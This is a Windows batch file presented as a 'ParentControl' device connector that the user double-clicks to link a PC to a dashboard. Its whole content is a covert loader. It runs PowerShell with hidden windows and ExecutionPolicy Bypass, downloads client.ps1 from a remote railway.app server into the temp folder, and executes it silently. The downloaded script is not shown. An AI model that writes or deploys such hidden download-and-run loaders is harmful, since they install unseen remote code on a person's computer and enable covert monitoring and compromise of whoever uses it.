@echo off
:: ═══════════════════════════════════════════════════════════════
:: ParentControl — Device Connector
:: Double-click this file to connect this PC to the dashboard
:: ═══════════════════════════════════════════════════════════════

set "SERVER=https://parent-control-production.up.railway.app"

:: Download client.ps1 from server and run it hidden
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"[Net.ServicePointManager]::SecurityProtocol='Tls12';" ^
"(New-Object Net.WebClient).DownloadFile('%SERVER%/download/client.ps1','$env:TEMP\pca.ps1');" ^
"Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -NonInteractive -File $env:TEMP\pca.ps1 -ServerUrl %SERVER%' -WindowStyle Hidden"

exit
